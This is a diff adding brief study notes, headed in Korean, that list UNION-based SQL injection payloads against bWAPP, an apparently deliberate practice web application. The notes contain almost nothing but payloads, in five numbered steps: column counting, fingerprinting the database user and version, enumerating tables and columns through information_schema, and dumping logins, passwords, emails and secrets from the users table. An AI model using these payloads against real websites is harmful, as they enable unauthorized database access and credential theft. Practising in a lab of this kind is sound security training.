@@ -1,0 +1,37 @@
+ 4) SQL 인젝션
+
+ ① 
+
+0' union select all 1#
+0' union select all 1,2 #
+0' union select all 1,2,3 #
+0' union select all 1,2,3,4 #
+0' union select all 1,2,3,4,5 #
+0' union select all 1,2,3,4,5,6 #
+0' union select all 1,2,3,4,5,6,7 #
+
+
+ ② 
+
+0' union select all 1,database(),user(),system_user(),version(),6,7 #
+
+
+ ③ 
+
+0' union select all 1,table_schema,table_name,4,5,6,7 from information_schema.tables #
+0' union select all 1,table_schema,table_name,4,5,6,7 from information_schema.tables limit 17,5 #
+0' union select all 1,table_schema,table_name,4,5,6,7 from information_schema.tables where table_schema='bWAPP' #
+
+
+ ④ 
+
+0' union select all 1,table_schema,table_name,4,column_name,6,7 from information_schema.columns #
+0' union select all 1,table_schema,table_name,4,column_name,6,7 from information_schema.columns where table_name='users' #
+
+0' union select all 1,table_schema,table_name,4,column_name,6,7 from information_schema.columns where table_name='users' and table_schema='bwapp' #
+
+
+ ⑤ 
+
+0' union select all 1,login,password,email,secret,6,7 from users #
+
